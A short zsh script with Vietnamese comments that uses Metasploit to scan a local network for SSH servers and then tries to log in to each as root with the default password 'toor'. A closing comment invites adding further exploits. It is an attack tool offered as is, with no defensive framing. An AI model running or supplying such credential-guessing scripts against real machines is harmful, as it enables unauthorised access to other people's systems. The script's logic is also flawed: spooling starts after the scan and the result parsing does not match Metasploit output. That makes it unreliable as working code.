#!/bin/zsh

# Khởi động Metasploit Framework
msfconsole -q -x "

# Tìm kiếm các dịch vụ SSH đang chạy trên mạng LAN
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# Lưu kết quả quét vào file
spool /tmp/ssh_scan_results.txt
exit
"

# Đọc kết quả quét và khai thác các dịch vụ SSH
while read -r line; do
    ip=$(echo $line | awk '{print $1}')
    port=$(echo $line | awk '{print $2}')
    
    # Ví dụ khai thác dịch vụ SSH với module ssh_login
    if [ "$port" == "22" ]; then
        msfconsole -q -x "
        use auxiliary/scanner/ssh/ssh_login
        set RHOSTS $ip
        set RPORT $port
        set USERNAME root
        set PASSWORD toor
        run
        exit
        "
    fi

    # Thêm các khai thác khác tại đây

done < /tmp/ssh_scan_results.txt
